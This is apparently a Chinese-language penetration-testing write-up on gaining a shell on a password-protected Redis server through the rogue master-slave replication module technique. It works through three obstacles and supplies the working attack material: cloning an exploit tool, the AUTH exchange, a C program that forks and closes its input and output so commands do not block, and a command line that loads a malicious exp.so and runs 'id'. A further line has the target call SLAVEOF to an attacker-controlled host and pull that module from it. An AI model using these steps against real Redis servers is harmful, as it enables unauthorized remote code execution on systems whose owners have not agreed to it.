Redis getshell三个小坑

一、前言

测试了一个有密钥redis的服务，已知密码 ，无法使用通用工具无法RCE。

二、被卡住1-redis主从复制过程

遇到的问题，看log日志是卡在复制那一步。最简单的做法是换工具，于是找了其他很多的工具均是一样的问题。

同时观察Replication，发现是有更新的， 说明redis是有更新的，那么大概率就是脚本的问题，而非redis的问题。

于是找了一眼可以打印所有通信过程的利用py。

git clone https://github.com/vulhub/redis-rogue-getshell

发现返回的同样，可疑的是给了一个返回验证，并且卡在此处，于是猜想根据我们发送验证给redis服务认证，redis返回一个OK，此时我们返回一个OK给redis是不是就OK了？

下面是我们发送redis的验证过程：

>> send data: b'*2\r\n$4\r\nAUTH\r\n$9\r\npassword\r\n'
>> receive data: b'+OK\r\n'

并且关掉卸载

三、被卡住2-执行命令被阻塞

这里可以通过fork方式，干掉输入输出流即可。

绕过延迟的问题，主要是输入输出描述符的问题，关闭就好了

gcc -static test.c -o test

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>


int main() {
    pid_t pid = fork();


    if (pid < 0) {
        // fork失败
        perror("fork failed");
        exit(EXIT_FAILURE);
    } else if (pid == 0) {
        // 子进程
        // 创建新的会话，脱离控制终端
        if (setsid() < 0) {
            perror("setsid failed");
            exit(EXIT_FAILURE);
        }


        // 关闭标准文件描述符
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);


        // 要运行的程序及其参数
        char *argv[] = { "/bin/sleep", "5", NULL };


        // 执行另一个程序
        if (execvp(argv[0], argv) == -1) {
            perror("execvp failed");
            exit(EXIT_FAILURE);
        }
    } else {
        // 父进程
        printf("Parent process: child process started with PID %d\n", pid);
        // 父进程不等待子进程，直接返回
        return 0;
    }
}

四、被卡住3-IP的问题

目前容器都有External IP的东西，但是不仅仅容器有这种，虚拟机同样有这种东西。

所以ifconfig的ip并非真实IP，导致攻击失败。

python3 redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp.so -c "id"

修改下面的lhost为vip即可。

client.send([b'SLAVEOF', lhost, lport])
